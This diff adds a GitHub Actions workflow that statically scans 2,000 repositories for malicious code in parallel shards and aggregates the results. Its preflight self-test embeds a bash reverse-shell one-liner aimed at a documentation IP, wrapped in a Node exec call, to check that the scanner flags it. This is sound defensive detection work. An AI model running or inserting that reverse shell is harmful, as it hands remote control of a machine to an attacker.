@@ -1,0 +1,174 @@
+name: DSH static audit rows 1-2000
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+
+concurrency:
+  group: dsh-audit-1-2000-${{ github.event.pull_request.number }}
+  cancel-in-progress: false
+
+jobs:
+  preflight:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Compile scanner and lock exact CSV targets
+        shell: bash
+        run: |
+          set -euo pipefail
+          python -m py_compile audit/build_targets.py audit/rules.py audit/scanner.py audit/aggregate.py
+          mkdir -p target_data
+          python audit/build_targets.py \
+            --output target_data/all_targets.json \
+            --meta-output target_data/target_meta.json
+          PYTHONPATH=audit python - <<'PY'
+          from scanner import classify_external_urls, evaluate_repository, scan_text
+
+          indicators, urls, _ = scan_text(
+              1,
+              "src/index.js",
+              "require('child_process').exec('bash -i >& /dev/tcp/198.51.100.4/4444 0>&1')",
+          )
+          findings = evaluate_repository(indicators, classify_external_urls({"src/index.js": urls}))
+          assert any(item["verdict"] == "malicious" for item in findings), findings
+
+          doc_indicators, _, _ = scan_text(
+              1,
+              "docs/reverse-shell-example.md",
+              "bash -i >& /dev/tcp/198.51.100.4/4444 0>&1",
+          )
+          assert not evaluate_repository(doc_indicators, []), doc_indicators
+          print("scanner synthetic checks passed")
+          PY
+      - name: Upload immutable target manifest
+        uses: actions/upload-artifact@v4
+        with:
+          name: dsh-audit-targets-1-2000
+          path: target_data/
+          retention-days: 1
+          if-no-files-found: error
+
+  scan:
+    needs: preflight
+    runs-on: ubuntu-latest
+    timeout-minutes: 240
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        chunk: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Download immutable target manifest
+        uses: actions/download-artifact@v4
+        with:
+          name: dsh-audit-targets-1-2000
+          path: target_data
+      - name: Select fixed 50-repository shard
+        shell: bash
+        env:
+          CHUNK_INDEX: ${{ matrix.chunk }}
+        run: |
+          set -euo pipefail
+          mkdir -p work
+          python - <<'PY'
+          import json
+          import os
+          from pathlib import Path
+
+          chunk = int(os.environ["CHUNK_INDEX"])
+          values = json.loads(Path("target_data/all_targets.json").read_text(encoding="utf-8"))
+          start = chunk * 50
+          selected = values[start:start + 50]
+          if len(selected) != 50:
+              raise SystemExit(f"chunk {chunk} has {len(selected)} targets")
+          Path("work/targets.json").write_text(
+              json.dumps(selected, ensure_ascii=False, indent=2) + "\n",
+              encoding="utf-8",
+          )
+          print(f"chunk={chunk} rows={selected[0]['row']}..{selected[-1]['row']}")
+          PY
+      - name: Read-only static source scan
+        shell: bash
+        env:
+          CHUNK_INDEX: ${{ matrix.chunk }}
+        run: |
+          set -euo pipefail
+          out="work/chunk-${CHUNK_INDEX}"
+          python audit/scanner.py \
+            --targets work/targets.json \
+            --output-dir "$out" \
+            --workers 3 \
+            --clone-timeout 90 \
+            --max-files 3500 \
+            --max-total-bytes 45000000 \
+            --max-file-bytes 1800000 \
+            --hard-file-bytes 12000000
+      - name: Upload shard results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: dsh-audit-chunk-${{ matrix.chunk }}
+          path: work/chunk-${{ matrix.chunk }}/
+          retention-days: 1
+          if-no-files-found: warn
+
+  aggregate:
+    needs: [preflight, scan]
+    if: always()
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Download target manifest
+        uses: actions/download-artifact@v4
+        with:
+          name: dsh-audit-targets-1-2000
+          path: target_data
+      - name: Download all available shard artifacts
+        continue-on-error: true
+        uses: actions/download-artifact@v4
+        with:
+          pattern: dsh-audit-chunk-*
+          path: shard_artifacts
+      - name: Aggregate and validate exact 2000-row coverage
+        id: aggregate
+        shell: bash
+        run: |
+          set +e
+          mkdir -p final
+          python audit/aggregate.py \
+            --targets target_data/all_targets.json \
+            --target-meta target_data/target_meta.json \
+            --artifacts-dir shard_artifacts \
+            --output-dir final
+          code=$?
+          echo "$code" > final/aggregate_exit_code.txt
+          exit 0
+      - name: Upload final preliminary report and coverage artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: dsh-audit-1-2000-preliminary
+          path: final/
+          retention-days: 1
+          if-no-files-found: error
+      - name: Enforce no missing rows
+        shell: bash
+        run: |
+          set -euo pipefail
+          test "$(cat final/aggregate_exit_code.txt)" = "0"
